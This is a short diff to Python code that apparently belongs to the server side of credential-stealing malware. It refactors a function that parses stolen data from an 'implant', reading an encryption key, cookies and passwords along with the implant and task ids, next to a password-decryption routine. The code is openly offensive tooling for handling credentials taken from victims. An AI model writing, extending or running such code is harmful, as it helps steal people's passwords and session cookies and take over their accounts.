@@ -78,10 +78,14 @@ def decrypt_password(encrypted_password, key):
 
 def newParseJSON(json_res):
     print("Starting new Parse JSON")
-    key = json_res['KEY']
-    cookies = json_res['COOKIES']
-    passwords = json_res['PASSWORDS']
-    target_implant_id = json_res['target_implant_id']
+
+    response_data = json_res.get('response_data')
+
+    key = response_data.get('KEY')
+    cookies = response_data.get('COOKIES')
+    passwords = response_data.get('PASSWORDS')
+
+    target_implant_id = json_res.get('target_implant_id')
     task_id = json_res['task_id']
 
     print("After getting dictionary keys")
